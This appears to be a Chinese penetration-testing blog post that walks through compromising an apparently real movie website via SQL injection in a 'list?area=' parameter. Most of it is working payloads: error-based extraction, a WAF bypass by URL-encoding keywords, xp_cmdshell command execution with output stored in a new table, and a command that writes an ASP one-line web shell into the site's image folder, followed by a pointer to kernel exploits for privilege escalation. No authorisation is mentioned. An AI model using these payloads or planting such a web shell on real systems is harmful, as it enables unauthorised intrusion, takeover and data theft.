---
title: SQL注入练手站
date: 2017-10-23 21:08:32
categories: Pentest
tags: SQLInjection
---


### 0x00 


使用[WhatWeb](https://whatweb.net/)来获取网站的一些基本信息
![](0.png)

对资源列表页面随手进行测试发现存在注入漏洞。

一般网站可能会对用户输入进行过滤，但是对于自己预置的参数值就会放松警惕，此处的`area`为影片的国家。
```
list?area=%E9%A6%99%E6%B8%AF&Category=
```
![](1.png)

```
list?area=1'
```
![](2.png)

尝试`order`出错
```
list?area=1' order by 1;-- 
```
**注：`--`后要接一个空格，或者直接使用`#`注释符，此处为sqlserver,不能使用`#`**

![](3.png)


### 0x01

既然能显示错误，那么考虑使用类型转换报错来返回结果。
```
list?area=1' and db_name(x)>0;-- 
```
**[注：`x`参数可用来选择不同数据库，为空即返回当前数据库名。][url]**
[url]:https://technet.microsoft.com/en-us/library/ms189753(v=sql.110).aspx
![](4.png)

直接猜存在`admin`表，猜到字段`user`和`pwd`

但是突然发现有WAF，过滤了一些关键字。

多次测试后发现可通过URL编码转换绕过。如：`select`改变一个`e`为 URL编码`%65`，使用`s%65lect`即可
```
list?area=1' and (s%65lect pwd from admin)>0 -- 
```
![](5.png)

结果不可解。

### 0x02

换思路

考虑命令执行

直接添加用户，提权，然后远程连接，发现没有成功。

但是，执行命令又不能直接在页面回显。

考虑把回显写到表中，然后通过读取表中的内容获得结果。

建个新表
```
list?area=1';
CR%65ATE TABLE fileList(line varchar(8000))-- 
```
执行命令，并把结果写入到表中
```
list?area=1';
IN%53ERT INTO fileList 
  %45XEC xp_cmdshell 'whoami'-- #  
```
直接读取只能读一行，使用`FOR XML`，可一次性获取全部内容
```
list?area=1' and (S%65LECT * FROM fileList FOR XML AUTO)>0 --
```
发现权限不够。

### 0x04
不能一步到位，就退而求其次，上个一句话

一开始想着写在`list`页面的同一个目录下

无奈发现，写入后，怎么都找不到。

经指点知，可能采用的是`SVM`结构的网站，最有效的写入路径应该是存储图片的文件夹
```
list?area=1';
IN%53ERT INTO fileList   
  %45XEC xp_cmdshell 'echo <%eval request("pass")%^>^ > c:\website\Movie\movie\Content\123.asp'-- 
```
**注：在cmd中使用`>`会被解析为输出符号，要想使用必须要用`^`包裹**

菜刀连接

### 0x05

[提权](https://github.com/SecWiki/windows-kernel-exploits)